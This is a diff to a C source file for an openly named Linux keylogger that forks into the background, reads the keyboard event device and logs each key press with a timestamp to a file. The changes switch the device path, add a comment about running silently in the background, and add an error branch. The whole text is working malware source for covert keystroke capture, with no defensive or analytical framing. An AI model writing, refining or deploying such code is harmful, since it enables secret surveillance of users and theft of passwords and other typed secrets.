@@ -7,10 +7,9 @@
 #include <string.h>
 
 void keylogger(const char *logfile) {
-    const char *device = "/dev/input/event3"; // Change this to your keyboard's event file
+    const char *device = "/dev/input/event2"; // Change this to your keyboard's event file
     struct input_event event;
 
-    // Fork the process to run in the background
     pid_t pid = fork();
     if (pid < 0) {
         perror("Error forking process");
@@ -43,13 +42,17 @@ void keylogger(const char *logfile) {
     fprintf(log, "Session started: %s\n", ctime(&now));
     fflush(log);
 
-    // Continuously read keystrokes and log them
+    // Run the keylogger in the background, without printing anything to the terminal
     while (1) {
         if (read(fd, &event, sizeof(struct input_event)) > 0) {
             if (event.type == EV_KEY && event.value == 1) { // Key press event
+                // Log the key press event to the log file
                 fprintf(log, "Key %d pressed at %ld\n", event.code, time(NULL));
-                fflush(log); // Ensure data is written immediately
+                fflush(log);  // Ensure data is written immediately
             }
+        } else {
+            // Debug: Print an error message if no data is read from the input file
+            perror("Error reading from device file");
         }
     }
 
